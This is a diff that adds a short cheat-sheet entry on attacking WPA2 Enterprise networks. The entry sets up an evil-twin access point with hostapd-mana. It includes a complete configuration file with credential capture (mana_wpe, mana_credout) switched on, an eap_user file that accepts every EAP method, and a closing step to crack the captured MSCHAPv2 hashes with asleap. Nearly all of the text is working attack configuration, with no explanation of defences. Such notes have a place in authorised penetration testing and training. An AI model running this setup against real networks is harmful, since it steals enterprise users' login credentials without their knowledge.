@@ -1,4 +1,41 @@
 ## WPA2 Enterprise - new release ##
 
+# Before taking a channel number and an AP's name, You have to find name of the wireless card, you can kill monitor process.
+
+# Stop monitor mode
+    airmon-ng stop wlan0
+
+# Create hostapd-mana.conf file
+
+    ssid=testAP
+    interface=wlan0
+    driver=nl80211
+    channel=13
+    hw_mode=g
+    ieee8021x=1
+    eap_server=1
+    eapol_key_index_workaround=0
+    eap_user_file=/etc/hostapd-mana/mana.eap_user
+    ca_cert=/etc/freeradius/3.0/certs/ca.pem
+    server_cert=/etc/freeradius/3.0/certs/server.pem
+    private_key=/etc/freeradius/3.0/certs/server.key
+    private_key_passwd=whatyouwantbro
+    dh_file=/etc/freeradius/3.0/certs/dh
+    auth_algs=1
+    wpa=3 # It means that wpa/wpa2
+    wpa_key_mgmt=WPA-EAP # It means that WPA Enterprise 
+    wpa_pairwise=CCMP TKIP
+    mana_wpe=1
+    mana_credout=/tmp/hostapd.credout
+    mana_eapsuccess=1
+    mana_eaptls=1
+    
+    
+# Create .eap_user file
+    
+    *     PEAP,TTLS,TLS,FAST
+    "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+#  get hash of captured user credantials and crack with asleap tool.
 
 
